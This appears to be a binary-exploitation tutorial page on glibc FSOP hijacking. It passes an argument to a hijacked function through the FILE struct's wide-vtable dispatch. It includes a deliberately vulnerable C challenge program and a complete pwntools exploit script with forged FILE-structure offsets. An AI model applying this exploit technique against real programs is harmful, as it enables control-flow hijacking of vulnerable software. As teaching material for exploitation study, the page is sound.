#metadata(
  (
    title: "Hijacking with Argument",
    description: "Advanced FSOP hijacking: passing arguments to functions by leveraging register states during the vtable dispatch.",
    date: "2026-01-02",
    order: 8,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Hijacking with Arguments

In basic FSOP hijacking, we redirect execution to a function like `win()` that requires no arguments. However, we can often control the arguments passed to the hijacked function by leveraging the state of registers at the time of the call.

In the `_IO_wfile_jumps` bypass, when the program eventually calls our target function (via `_IO_wdoallocbuf`), the first argument (`rdi`) is still the pointer to the `FILE` structure (`fp`).

#quote(attribution: [Fun Fact])([
  During the entire chain from `fwrite` down to `_IO_wdoallocbuf`, the `rdi` register (and often `rsi`) remains populated with the address of the `FILE` structure. This means the hijacked function will receive the corrupted `FILE` struct as its first argument.
])

== Vulnerable Scenario

This challenge requires us to call `authenticate(char *pw)` with the correct password. Since `rdi` will point to the start of our corrupted `FILE` struct, we can simply place the password string at the very beginning of the structure (the `_flags` field).

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

FILE *fp;
char *buf;

void authenticate(char *pw) {
  if (strcmp(pw, "password") == 0) {
    puts("Well done baby");
    return;
  } else {
    puts("You are not 1337 enough.");
    exit(1);
  }
}

int main(int argc, char **argv, char **envp) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("libc leak: %p\n", puts);

  buf = malloc(0x100);
  fp = fopen("/tmp/uiiaiiuuiiai.txt", "r");

  printf("file pointer leak: %p\n", fp);

  // Overflow into the FILE structure
  read(0, fp, 0x1e0);

  // This will call authenticate(fp)
  fwrite(buf, 1, 0x100, fp);

  return 0;
}
```

== Exploit Strategy: Stable Argument Passing

To ensure our payload remains intact during execution, we use the stable alignment technique. We place our target function pointer and its argument string in areas of the `FILE` struct that are not overwritten by Glibc.

1. *Password Placement*: We place `"password\0"` at offset `0x00`. Since `rdi` points to the start of the `FILE` struct, `authenticate` will read the password correctly.
2. *Stable Alignment*: We store the `_wide_vtable` pointer at offset `0x58` (unused space).
3. *The Dispatch*: By setting `_wide_data = fp - 0x88`, the `_wide_vtable` lookup at offset `0xE0` lands exactly on our pointer at `0x58`, which points back to `fp`. The call to `_wide_vtable + 0x68` then jumps to our target function stored at `fp + 0x68`.

== Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./challenge")
p = process(elf.path)
libc = elf.libc

# 1. Parse leaks
p.recvuntil(b"libc leak: ")
libc.address = int(p.recvline().strip(), 16) - libc.sym.puts
info(f"Libc base: {hex(libc.address)}")

p.recvuntil(b"file pointer leak: ")
fp_addr = int(p.recvline().strip(), 16)
info(f"FILE pointer (fp): {hex(fp_addr)}")

# 2. Construct the stable self-overlapping payload
# Offset 0x00: password (rdi)
# Offset 0x58: wide_vtable ptr
# Offset 0x68: Target function (authenticate)
# Offset 0xA0: wide_data shifted to align 0xE0 with 0x58
payload = flat(
    {
        0x00: b"password\0",                    # Password string for rdi
        0x58: fp_addr,                          # Acts as _wide_vtable pointer
        0x68: elf.sym.authenticate,             # _chain / doallocate target function
        0x88: fp_addr - 0x10,                   # _lock (must be writable)
        0xA0: fp_addr - 0x88,                   # _wide_data (shifted alignment)
        0xD8: libc.sym._IO_wfile_jumps - 0x20,  # vtable -> targets _IO_wfile_overflow
    },
    filler=b"\x00",
)

p.sendline(payload)

p.interactive()
```

